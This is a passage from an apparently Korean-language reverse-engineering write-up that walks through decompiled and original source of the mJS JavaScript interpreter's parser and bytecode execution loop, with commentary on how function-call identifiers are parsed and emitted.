int)p-\u003eline_no, 10LL, p-\u003etok.ptr, off_else); return 1; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 485) ) cs_log_printf(\" PNEXT %d\", 485LL); pnext(p); resb = parse_ternary(p, 0); if ( resb ) return resb; off_endifa = off_endif + mjs_bcode_insert_offset(p, p-\u003emjs, off_else, p-\u003ecur_idx - off_else - 1); mjs_bcode_insert_offset(p, p-\u003emjs, off_if, off_endifa - off_if - 1); } return 0; } return res; } mjs_err_t __cdecl parse_logical_or(pstate *p, int prev_op) { uint8_t v2; // al size_t off_if; // [rsp+8h] [rbp-28h] int op; // [rsp+14h] [rbp-1Ch] mjs_err_t res; // [rsp+18h] [rbp-18h] int ops[2]; // [rsp+1Ch] [rbp-14h] BYREF int prev_opa; // [rsp+24h] [rbp-Ch] pstate *pa; // [rsp+28h] [rbp-8h] pa = p; prev_opa = prev_op; *(_QWORD *)ops = 43LL; ++p-\u003edepth; if ( pa-\u003edepth \u003c= 512 ) { res = parse_logical_and(pa, 0); if ( res == MJS_OK ) { if ( prev_opa ) emit_op(pa, prev_opa); if ( findtok(ops, pa-\u003etok.tok) ) { op = pa-\u003etok.tok; off_if = 0LL; if ( ops[0] == 42 || ops[0] == 43 ) { v2 = 6; if ( ops[0] == 42 ) v2 = 8; emit_byte(pa, v2); off_if = pa-\u003ecur_idx; emit_init_offset(pa); emit_byte(pa, 1u); op = 0; } if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 460) ) cs_log_printf(\" PNEXT %d\", 460LL); pnext(pa); res = parse_logical_or(pa, op); if ( res == MJS_OK \u0026\u0026 off_if ) mjs_bcode_insert_offset(pa, pa-\u003emjs, off_if, pa-\u003ecur_idx - off_if - 1); } } } else { mjs_set_errorf(pa-\u003emjs, MJS_SYNTAX_ERROR, \"parser stack overflow\"); res = MJS_SYNTAX_ERROR; } --pa-\u003edepth; return res; } 함수 기본적인 틀은 다 똑같다. 매크로로 구현해둬서 그렇다. parse_unary에서만 조금 바뀐다.\nmjs_err_t __cdecl parse_unary(pstate *p, int prev_op) { int op; // [rsp+4h] [rbp-1Ch] mjs_err_t res; // [rsp+8h] [rbp-18h] op = 0; if ( findtok(\u0026s_unary_ops, p-\u003etok.tok) ) { op = p-\u003etok.tok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 399) ) cs_log_printf(\" PNEXT %d\", 399LL); pnext(p); } if ( findtok(\u0026s_unary_ops, p-\u003etok.tok) ) res = parse_unary(p, prev_op); else res = parse_postfix(p, prev_op); if ( res ) return res; if ( op ) { if ( op == 14 ) op = 51; if ( op == 13 ) op = 50; emit_op(p, op); } return 0; } 일반적인 문자들은 parse_postfix를 타고 들어간다.\nmjs_err_t __cdecl parse_postfix(pstate *p, int prev_op) { int v2; // eax mjs_err_t res; // [rsp+8h] [rbp-18h] res = parse_call_dot_mem(p, prev_op); if ( res ) return res; if ( p-\u003etok.tok == 29 || p-\u003etok.tok == 28 ) { v2 = 53; if ( p-\u003etok.tok == 29 ) v2 = 52; emit_op(p, v2); if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 389) ) cs_log_printf(\" PNEXT %d\", 389LL); pnext(p); } return 0; } parse_call_dot_mem은 그냥 소스코드로 보는게 더 편하다.\nstatic mjs_err_t parse_call_dot_mem(struct pstate *p, int prev_op) { int ops[] = {TOK_DOT, TOK_OPEN_PAREN, TOK_OPEN_BRACKET, TOK_EOF}; mjs_err_t res = MJS_OK; if ((res = parse_literal(p, \u0026p-\u003etok)) != MJS_OK) return res; while (findtok(ops, p-\u003etok.tok) != TOK_EOF) { if (p-\u003etok.tok == TOK_OPEN_BRACKET) { int prev_tok = p-\u003eprev_tok; EXPECT(p, TOK_OPEN_BRACKET); if ((res = parse_expr(p)) != MJS_OK) return res; emit_byte(p, OP_SWAP); EXPECT(p, TOK_CLOSE_BRACKET); if (!findtok(s_assign_ops, p-\u003etok.tok) \u0026\u0026 !findtok(s_postfix_ops, p-\u003etok.tok) \u0026\u0026 /* TODO(dfrank): fix: it doesn't work for prefix ops */ !findtok(s_postfix_ops, prev_tok)) { emit_byte(p, OP_GET); } } else if (p-\u003etok.tok == TOK_OPEN_PAREN) { EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_ARGS); while (p-\u003etok.tok != TOK_CLOSE_PAREN) { if ((res = parse_expr(p)) != MJS_OK) return res; if (p-\u003etok.tok == TOK_COMMA) pnext1(p); } emit_byte(p, OP_CALL); EXPECT(p, TOK_CLOSE_PAREN); } else if (p-\u003etok.tok == TOK_DOT) { EXPECT(p, TOK_DOT); if ((res = parse_call_dot_mem(p, TOK_DOT)) != MJS_OK) return res; } } (void) prev_op; return res; } ()를 구분해서 arg도 잘 넣어준다. parse_literal을 통해서 문자열을 읽는다. js 코드에서 mjs_print를 호출하려고 print()를 호출하면, 문자열 print는 parse_literal 함수에서 파싱된다.\nmjs_err __cdecl parse_literal(pstate *p, const tok *t) { uint8_t v2; // al __m128d v3; // xmm1 enum mjs_OPCODE v5; // [rsp+Ch] [rbp-54h] size_t oldlen; // [rsp+10h] [rbp-50h] unsigned __int64 uv; // [rsp+18h] [rbp-48h] BYREF double d; // [rsp+20h] [rbp-40h] double iv; // [rsp+28h] [rbp-38h] BYREF int next_tok; // [rsp+30h] [rbp-30h] int prev_tok; // [rsp+34h] [rbp-2Ch] int tok; // [rsp+38h] [rbp-28h] mjs_err res; // [rsp+3Ch] [rbp-24h] mbuf *bcode_gen; // [rsp+40h] [rbp-20h] const tok *ta; // [rsp+48h] [rbp-18h] BYREF pstate *pa; // [rsp+50h] [rbp-10h] pa = p; ta = t; bcode_gen = \u0026p-\u003emjs-\u003ebcode_gen; res = MJS_OK; tok = t-\u003etok; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 276) ) cs_log_printf(\"[%.*s] %p\", pa-\u003etok.len, pa-\u003etok.ptr, \u0026ta); *(_DWORD *)\u0026v5 = ta-\u003etok; if ( ta-\u003etok == TOK_ASSIGN ) { res = parse_object_literal(pa); } else { switch ( *(_DWORD *)\u0026v5 ) { case 8: if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 331) ) cs_log_printf(\" PNEXT %d\", 331LL); pnext(pa); res = parse_expr(pa); if ( pa-\u003etok.tok != TOK_OPEN_PAREN ) goto LABEL_39; break; case 0xA: res = parse_array_literal(pa); break; case 0xC8: d = strtod(ta-\u003eptr, 0LL); uv = strtoul(ta-\u003eptr + 2, 0LL, 16); if ( *ta-\u003eptr == 48 \u0026\u0026 *((_BYTE *)ta-\u003eptr + 1) == 120 ) { v3 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32(_mm_loadl_epi64((const __m128i *)\u0026uv), (__m128i)xmmword_24020), (__m128d)xmmword_24030); d = _mm_unpackhi_pd(v3, v3).m128d_f64[0] + v3.m128d_f64[0]; } if ( modf(d, \u0026iv) == 0.0 ) { emit_byte(pa, 0xEu); emit_int(pa, (unsigned int)(int)d); } else { emit_byte(pa, 0xFu); emit_str(pa, ta-\u003eptr, ta-\u003elen); } break; case 0xC9: emit_byte(pa, 0xBu); oldlen = bcode_gen-\u003elen; embed_string(bcode_gen, pa-\u003ecur_idx, ta-\u003eptr, ta-\u003elen, 2u); pa-\u003ecur_idx += LODWORD(bcode_gen-\u003elen) - oldlen; break; case 0xCA: prev_tok = pa-\u003eprev_tok; next_tok = ptest(pa); emit_byte(pa, 0xBu); emit_str(pa, ta-\u003eptr, ta-\u003elen); v2 = 9; if ( prev_tok == 0x14 ) v2 = 3; emit_byte(pa, v2); // PUSH STR if ( !findtok(\u0026s_assign_ops, next_tok) \u0026\u0026 !findtok(\u0026s_postfix_ops, next_tok) \u0026\u0026 !findtok(\u0026s_postfix_ops, prev_tok) )// ++, -- { emit_byte(pa, 0x16u); } break; case 0xD4: emit_byte(pa, 0xDu); break; case 0xD7: res = parse_function(pa); break; case 0xDC: emit_byte(pa, 0x10u); break; case 0xDF: emit_byte(pa, 0x15u); break; case 0xE1: emit_byte(pa, 0xCu); break; case 0xE9: emit_byte(pa, 0x11u); break; default: LABEL_39: mjs_set_errorf( pa-\u003emjs, MJS_SYNTAX_ERROR, \"parse error at line %d: [%.*s]\", (unsigned int)pa-\u003eline_no, 10LL, pa-\u003etok.ptr); return 1; } } if ( tok != 0xD7 ) { if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_parser.c\", 344) ) cs_log_printf(\" PNEXT %d\", 344LL); pnext(pa); } return res; } 여기서 주목할건 parse_function이다.\nstatic mjs_err_t parse_function(struct pstate *p) { size_t prologue, off; int arg_no = 0; int name_provided = 0; mjs_err_t res = MJS_OK; EXPECT(p, TOK_KEYWORD_FUNCTION); if (p-\u003etok.tok == TOK_IDENT) { /* Function name was provided */ struct tok tmp = p-\u003etok; name_provided = 1; emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_PUSH_SCOPE); emit_byte(p, OP_CREATE); emit_byte(p, OP_PUSH_STR); emit_str(p, tmp.ptr, tmp.len); emit_byte(p, OP_FIND_SCOPE); pnext1(p); } emit_byte(p, OP_JMP); off = p-\u003ecur_idx; emit_init_offset(p); prologue = p-\u003ecur_idx; EXPECT(p, TOK_OPEN_PAREN); emit_byte(p, OP_NEW_SCOPE); // Emit names of function arguments while (p-\u003etok.tok != TOK_CLOSE_PAREN) { if (p-\u003etok.tok != TOK_IDENT) SYNTAX_ERROR(p); emit_byte(p, OP_SET_ARG); emit_int(p, arg_no); arg_no++; emit_str(p, p-\u003etok.ptr, p-\u003etok.len); if (ptest(p) == TOK_COMMA) pnext1(p); pnext1(p); } EXPECT(p, TOK_CLOSE_PAREN); if ((res = parse_block(p, 0)) != MJS_OK) return res; emit_byte(p, OP_RETURN); prologue += mjs_bcode_insert_offset(p, p-\u003emjs, off, p-\u003ecur_idx - off - MJS_INIT_OFFSET_SIZE); emit_byte(p, OP_PUSH_FUNC); emit_int(p, p-\u003ecur_idx - 1 /* OP_PUSH_FUNC */ - prologue); if (name_provided) { emit_op(p, TOK_ASSIGN); } return res; } 소스코드로 보면 명확하게 보인다. tok는 ident로 들어가기 때문에, 결국 print 문자열을 그대로 집어넣게 된다.\njs가 인터프리터 언어라서 그런지 예상했던대로 그대로 문자열을 넣는다.\nres = parse_statement_list(\u0026p, 0); emit_byte(\u0026p, 0x23u); // OP_EXIT *(_DWORD *)\u0026p.mjs-\u003ebcode_gen.buf[start_idx + 8] = p.mjs-\u003ebcode_gen.len - start_idx; map_len = p.offset_lineno_map.len; llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len)); mbuf_resize(\u0026p.mjs-\u003ebcode_gen, llen + p.mjs-\u003ebcode_gen.size); cs_varint_encode(map_len, (uint8_t *)\u0026p.mjs-\u003ebcode_gen.buf[p.mjs-\u003ebcode_gen.len], llen); p.mjs-\u003ebcode_gen.len += llen; mbuf_append(\u0026p.mjs-\u003ebcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len); *(_DWORD *)\u0026p.mjs-\u003ebcode_gen.buf[start_idx] = p.mjs-\u003ebcode_gen.len - start_idx; mbuf_free(\u0026p.offset_lineno_map); if ( res ) mbuf_free(\u0026mjsa-\u003ebcode_gen); else mjs_bcode_commit(mjsa); return res; } mjs_parse 함수의 뒷부분을 보면 파싱이 끝나고 mjs_bcode_commit을 통해서 mjs-\u003ebcode_parts로 바이트 코드를 옮기는 것을 알 수 있다.\nmjs_execute mjs_err_t __cdecl mjs_execute(mjs *mjs, size_t off, mjs_val_t *res) { mjs_val_t v3; // rax mjs_val_t v4; // rax mjs_val_t v5; // rax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax mjs_val_t v9; // rax mjs_val_t v10; // rax mjs_val_t v11; // rax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax double v18; // xmm0_8 mjs_val_t v19; // rax __m128d v20; // xmm1 mjs_val_t v21; // rax void (__fastcall *ptr)(mjs *); // rax mjs_val_t *v23; // rax mjs_val_t v24; // rax __m128d v25; // xmm1 mjs_val_t v26; // rax __m128d v27; // xmm1 mjs_val_t v28; // rax __m128d v29; // xmm1 mjs_val_t v30; // rax mjs_val_t *v31; // rax mjs_val_t v32; // rax mjs_val_t v33; // rax mjs_val_t v34; // rax mjs_bcode_part *v35; // rax mjs_val_t v36; // rax mjs_err error; // [rsp+4h] [rbp-2DCh] mjs *v39; // [rsp+8h] [rbp-2D8h] mjs *v40; // [rsp+10h] [rbp-2D0h] mjs *v41; // [rsp+18h] [rbp-2C8h] mjs *v42; // [rsp+20h] [rbp-2C0h] mjs *v43; // [rsp+28h] [rbp-2B8h] mbuf *p_loop_addresses; // [rsp+30h] [rbp-2B0h] mbuf *v45; // [rsp+38h] [rbp-2A8h] mbuf *v46; // [rsp+68h] [rbp-278h] mjs *v47; // [rsp+70h] [rbp-270h] mjs *v48; // [rsp+78h] [rbp-268h] mjs_val_t v49; // [rsp+80h] [rbp-260h] mjs *v50; // [rsp+88h] [rbp-258h] mbuf *p_arg_stack; // [rsp+90h] [rbp-250h] mjs *v52; // [rsp+98h] [rbp-248h] mjs *v53; // [rsp+A0h] [rbp-240h] mjs *v54; // [rsp+A8h] [rbp-238h] mjs *v55; // [rsp+B0h] [rbp-230h] mjs *v56; // [rsp+B8h] [rbp-228h] mbuf *m; // [rsp+C0h] [rbp-220h] mjs *v58; // [rsp+C8h] [rbp-218h] mjs *v59; // [rsp+D0h] [rbp-210h] mjs *v60; // [rsp+D8h] [rbp-208h] mjs *v61; // [rsp+E0h] [rbp-200h] mjs *v62; // [rsp+E8h] [rbp-1F8h] mjs *v63; // [rsp+F0h] [rbp-1F0h] mjs *v64; // [rsp+F8h] [rbp-1E8h] mjs *v65; // [rsp+100h] [rbp-1E0h] mjs *v66; // [rsp+108h] [rbp-1D8h] mjs *v67; // [rsp+110h] [rbp-1D0h] mjs *v68; // [rsp+118h] [rbp-1C8h] size_t scopes_len_1; // [rsp+128h] [rbp-1B8h] size_t scopes_len_0; // [rsp+130h] [rbp-1B0h] int off_0; // [rsp+13Ch] [rbp-1A4h] int off_0a; // [rsp+13Ch] [rbp-1A4h] int l2; // [rsp+140h] [rbp-1A0h] BYREF int l1; // [rsp+144h] [rbp-19Ch] BYREF mjs_val_t b; // [rsp+148h] [rbp-198h] mjs_val_t a; // [rsp+150h] [rbp-190h] int op; // [rsp+15Ch] [rbp-184h] size_t retval_pos; // [rsp+160h] [rbp-180h] mjs_val_t v; // [rsp+168h] [rbp-178h] mjs_val_t key_3; // [rsp+170h] [rbp-170h] mjs_val_t obj_2; // [rsp+178h] [rbp-168h] int v82; // [rsp+180h] [rbp-160h] int n_7; // [rsp+184h] [rbp-15Ch] int llen2; // [rsp+188h] [rbp-158h] BYREF int llen1; // [rsp+18Ch] [rbp-154h] BYREF size_t off_call; // [rsp+190h] [rbp-150h] mjs_val_t retval_stack_idx; // [rsp+198h] [rbp-148h] mjs_val_t *func; // [rsp+1A0h] [rbp-140h] int func_pos; // [rsp+1ACh] [rbp-134h] size_t off_ret; // [rsp+1B0h] [rbp-130h] mjs_val_t scope; // [rsp+1B8h] [rbp-128h] mjs_val_t key_2; // [rsp+1C0h] [rbp-120h] mjs_val_t name; // [rsp+1C8h] [rbp-118h] mjs_val_t obj_1; // [rsp+1D0h] [rbp-110h] mjs_val_t *iterator; // [rsp+1D8h] [rbp-108h] int n_6; // [rsp+1E0h] [rbp-100h] int llen_6; // [rsp+1E4h] [rbp-FCh] BYREF int64_t n_5; // [rsp+1E8h] [rbp-F8h] int llen_5; // [rsp+1F4h] [rbp-ECh] BYREF int length; // [rsp+1F8h] [rbp-E8h] int llen_4; // [rsp+1FCh] [rbp-E4h] BYREF mjs_val_t val_0; // [rsp+200h] [rbp-E0h] BYREF mjs_val_t key_1; // [rsp+208h] [rbp-D8h] mjs_val_t obj_0; // [rsp+210h] [rbp-D0h] mjs_val_t arr; // [rsp+220h] [rbp-C0h] mjs_val_t val; // [rsp+228h] [rbp-B8h] mjs_val_t key_0; // [rsp+230h] [rbp-B0h] mjs_val_t obj; // [rsp+238h] [rbp-A8h] mjs_val_t key; // [rsp+240h] [rbp-A0h] int n_3; // [rsp+24Ch] [rbp-94h] int llen_3; // [rsp+250h] [rbp-90h] BYREF int n_2; // [rsp+254h] [rbp-8Ch] int llen_2; // [rsp+258h] [rbp-88h] BYREF int n_1; // [rsp+25Ch] [rbp-84h] int llen_1; // [rsp+260h] [rbp-80h] BYREF int n_0; // [rsp+264h] [rbp-7Ch] int llen_0; // [rsp+268h] [rbp-78h] BYREF int n; // [rsp+26Ch] [rbp-74h] int llen; // [rsp+270h] [rbp-70h] BYREF mjs_header_item_t bcode_offset; // [rsp+274h] [rbp-6Ch] mjs_bcode_part bp_0; // [rsp+278h] [rbp-68h] const uint8_t *code; // [rsp+298h] [rbp-48h] size_t start_off; // [rsp+2A0h] [rbp-40h] int loop_addresses_len; // [rsp+2A8h] [rbp-38h] int scopes_len; // [rsp+2ACh] [rbp-34h] int len; // [rsp+2B0h] [rbp-30h] int call_stack_len; // [rsp+2B4h] [rbp-2Ch] int stack_len; // [rsp+2B8h] [rbp-28h] uint8_t opcode; // [rsp+2BEh] [rbp-22h] uint8_t prev_opcode; // [rsp+2BFh] [rbp-21h] size_t i; // [rsp+2C0h] [rbp-20h] mjs_val_t *resa; // [rsp+2C8h] [rbp-18h] size_t offa; // [rsp+2D0h] [rbp-10h] mjs *mjsa; // [rsp+2D8h] [rbp-8h] mjsa = mjs; offa = off; resa = res; prev_opcode = 0x27; opcode = 0x27; stack_len = mjs-\u003estack.len; call_stack_len = mjs-\u003ecall_stack.len; len = mjs-\u003earg_stack.len; scopes_len = mjs-\u003escopes.len; loop_addresses_len = mjs-\u003eloop_addresses.len; start_off = off; bp_0 = *mjs_bcode_part_get_by_offset(mjs, off); mjs_set_errorf(mjs, MJS_OK, 0LL); free(mjs-\u003estack_trace); mjs-\u003estack_trace = 0LL; offa -= bp_0.start_idx; i = offa; while ( 2 ) { if ( i \u003e= bp_0.data.len ) goto clean; mjsa-\u003ecur_bcode_offset = i; if ( (*((_BYTE *)mjsa + 464) \u0026 2) != 0 \u0026\u0026 maybe_gc(mjsa) ) *((_BYTE *)mjsa + 464) \u0026= ~2u; code = (const uint8_t *)bp_0.data.p; mjs_disasm_single((const uint8_t *)bp_0.data.p, i); prev_opcode = opcode; opcode = code[i]; switch ( opcode ) { case 0u: goto LABEL_93; case 1u: mjs_pop(mjsa); goto LABEL_93; case 2u: v47 = mjsa; v24 = vtop(\u0026mjsa-\u003estack); mjs_push(v47, v24); goto LABEL_93; case 3u: a = mjs_pop(mjsa); b = mjs_pop(mjsa); mjs_push(mjsa, a); mjs_push(mjsa, b); goto LABEL_93; case 4u: n_0 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_0); i += llen_0 + n_0; goto LABEL_93; case 6u: n_2 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_2); i += llen_2; v60 = mjsa; v11 = vtop(\u0026mjsa-\u003estack); if ( mjs_is_truthy(v60, v11) ) i += n_2; goto LABEL_93; case 7u: n_1 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_1); i += llen_1; v61 = mjsa; v10 = mjs_pop(mjsa); if ( !mjs_is_truthy(v61, v10) ) { mjs_push(mjsa, 0xFFF3000000000000LL); i += n_1; } goto LABEL_93; case 8u: n_3 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_3); i += llen_3; v59 = mjsa; v12 = vtop(\u0026mjsa-\u003estack); if ( !mjs_is_truthy(v59, v12) ) i += n_3; goto LABEL_93; case 9u: key = vtop(\u0026mjsa-\u003estack); v58 = mjsa; v13 = mjs_find_scope(mjsa, key); mjs_push(v58, v13); goto LABEL_93; case 0xAu: if ( !mjs_stack_size(\u0026mjsa-\u003escopes) ) __assert_fail( \"mjs_stack_size(\u0026mjs-\u003escopes) \u003e 0\", \"src/mjs_exec.c\", 0x2D5u, \"mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\"); v56 = mjsa; v15 = vtop(\u0026mjsa-\u003escopes); mjs_push(v56, v15); goto LABEL_93; case 0xBu: length = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; case 0xCu: v65 = mjsa; v6 = mjs_mk_boolean(mjsa, 1); mjs_push(v65, v6); goto LABEL_93; case 0xDu: v66 = mjsa; v5 = mjs_mk_boolean(mjsa, 0); mjs_push(v66, v5); goto LABEL_93; case 0xEu: n_5 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_5); v54 = mjsa; v17 = mjs_mk_number(mjsa, (double)(int)n_5); mjs_push(v54, v17); i += llen_5; goto LABEL_93; case 0xFu: n_6 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_6); v53 = mjsa; v52 = mjsa; v18 = strtod((const char *)\u0026code[i + 1 + llen_6], 0LL); v19 = mjs_mk_number(v52, v18); mjs_push(v53, v19); i += n_6 + llen_6; goto LABEL_93; case 0x10u: v68 = mjsa; v3 = mjs_mk_null(); mjs_push(v68, v3); goto LABEL_93; case 0x11u: v67 = mjsa; v4 = mjs_mk_undefined(); mjs_push(v67, v4); goto LABEL_93; case 0x12u: v64 = mjsa; v7 = mjs_mk_object(mjsa); mjs_push(v64, v7); goto LABEL_93; case 0x13u: v63 = mjsa; v8 = mjs_mk_array(mjsa); mjs_push(v63, v8); goto LABEL_93; case 0x14u: n = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen); v62 = mjsa; v9 = mjs_mk_function(mjsa, i + bp_0.start_idx - n); mjs_push(v62, v9); i += llen; goto LABEL_93; case 0x15u: mjs_push(mjsa, mjsa-\u003evals.this_obj); goto LABEL_93; case 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u003e GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \"type error\"); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u003evals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u003evals.last_getprop_obj = obj_0; goto LABEL_93; case 0x17u: obj = mjs_pop(mjsa); key_0 = mjs_pop(mjsa); if ( !mjs_get_own_property_v(mjsa, obj, key_0) ) mjs_set_v(mjsa, obj, key_0, 0xFFF3000000000000LL); goto LABEL_93; case 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; goto LABEL_93; case 0x19u: val = mjs_pop(mjsa); arr = mjs_pop(mjsa); if ( mjs_array_push(mjsa, arr, val) ) mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \"append to non-array\"); goto LABEL_93; case 0x1Au: v82 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen1); n_7 = cs_varint_decode_unsafe(\u0026code[llen1 + 1 + i], \u0026llen2); key_3 = mjs_mk_string(mjsa, (const char *)\u0026code[i + 1 + llen1 + llen2], n_7, 1); obj_2 = vtop(\u0026mjsa-\u003escopes); v = mjs_arg(mjsa, v82); mjs_set_v(mjsa, obj_2, key_3, v); i += n_7 + llen2 + llen1; goto LABEL_93; case 0x1Bu: m = \u0026mjsa-\u003escopes; v14 = mjs_mk_object(mjsa); push_mjs_val(m, v14); goto LABEL_93; case 0x1Cu: if ( mjsa-\u003escopes.len \u003e 1 ) mjs_pop_val(\u0026mjsa-\u003escopes); else mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \"scopes underflow\"); goto LABEL_93; case 0x1Du: retval_stack_idx = vtop(\u0026mjsa-\u003earg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026mjsa-\u003estack, func_pos); // get pointer mjs_pop_val(\u0026mjsa-\u003earg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \"calling non-callable\"); } goto LABEL_93; case 0x1Eu: off_ret = call_stack_restore_frame(mjsa); if ( off_ret == 0x7FFFFFFF ) goto clean; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_ret); code = (const uint8_t *)bp_0.data.p; i = off_ret - bp_0.start_idx; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_exec.c\", 781) ) cs_log_printf(\"RETURNING TO %d\", (unsigned int)(off_ret + 1)); LABEL_93: if ( mjsa-\u003eerror == MJS_OK ) { ++i; continue; } mjs_gen_stack_trace(mjsa, i + bp_0.start_idx - 1); mjsa-\u003estack.len = stack_len; mjsa-\u003ecall_stack.len = call_stack_len; mjsa-\u003earg_stack.len = len; mjsa-\u003escopes.len = scopes_len; mjsa-\u003eloop_addresses.len = loop_addresses_len; mjs_push(mjsa, 0xFFF3000000000000LL); clean: error = mjsa-\u003eerror; v35 = mjs_bcode_part_get_by_offset(mjsa, start_off); *((_BYTE *)v35 + 24) = error \u0026 0xF | *((_BYTE *)v35 + 24) \u0026 0xF0; v36 = mjs_pop(mjsa); *resa = v36; return mjsa-\u003eerror; case 0x1Fu: off_0 = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026l1); v43 = mjsa; p_loop_addresses = \u0026mjsa-\u003eloop_addresses; v25 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026mjsa-\u003escopes), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v26 = mjs_mk_number(v43, _mm_unpackhi_pd(v25, v25).m128d_f64[0] + v25.m128d_f64[0]); push_mjs_val(p_loop_addresses, v26); v45 = \u0026mjsa-\u003eloop_addresses; v27 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v28 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v27, v27).m128d_f64[0] + v27.m128d_f64[0]); push_mjs_val(v45, v28); off_0a = cs_varint_decode_unsafe(\u0026code[l1 + 1 + i], \u0026l2); v46 = \u0026mjsa-\u003eloop_addresses; v29 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)(off_0a + l2 + l1 + i + 1), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v30 = mjs_mk_number(mjsa, _mm_unpackhi_pd(v29, v29).m128d_f64[0] + v29.m128d_f64[0]); push_mjs_val(v46, v30); i += l2 + l1; goto LABEL_93; case 0x20u: if ( mjs_stack_size(\u0026mjsa-\u003eloop_addresses) \u003c 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \"misplaced 'break'\"); } else { mjs_pop_val(\u0026mjsa-\u003eloop_addresses); v39 = mjsa; v33 = mjs_pop_val(\u0026mjsa-\u003eloop_addresses); i = mjs_get_int(v39, v33) - 1; v40 = mjsa; v34 = mjs_pop_val(\u0026mjsa-\u003eloop_addresses); scopes_len_1 = mjs_get_int(v40, v34); if ( mjs_stack_size(\u0026mjsa-\u003escopes) \u003c scopes_len_1 ) __assert_fail( \"mjs_stack_size(\u0026mjs-\u003escopes) \u003e= scopes_len\", \"src/mjs_exec.c\", 0x3B5u, \"mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\"); mjsa-\u003escopes.len = 8 * scopes_len_1; if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, \"src/mjs_exec.c\", 952) ) cs_log_printf(\"BREAKING TO %d\", (unsigned int)(i + 1)); } goto LABEL_93; case 0x21u: if ( mjs_stack_size(\u0026mjsa-\u003eloop_addresses) \u003c 3 ) { mjs_set_errorf(mjsa, MJS_SYNTAX_ERROR, \"misplaced 'continue'\"); } else { v42 = mjsa; v31 = vptr(\u0026mjsa-\u003eloop_addresses, -3); scopes_len_0 = mjs_get_int(v42, *v31); if ( mjs_stack_size(\u0026mjsa-\u003escopes) \u003c scopes_len_0 ) __assert_fail( \"mjs_stack_size(\u0026mjs-\u003escopes) \u003e= scopes_len\", \"src/mjs_exec.c\", 0x3A1u, \"mjs_err_t mjs_execute(struct mjs *, size_t, mjs_val_t *)\"); mjsa-\u003escopes.len = 8 * scopes_len_0; v41 = mjsa; v32 = vtop(\u0026mjsa-\u003eloop_addresses); i = mjs_get_int(v41, v32) - 1; } goto LABEL_93; case 0x22u: if ( mjs_stack_size(\u0026mjsa-\u003ecall_stack) \u003e= 5 ) { v48 = mjsa; v23 = vptr(\u0026mjsa-\u003ecall_stack, -1); retval_pos = 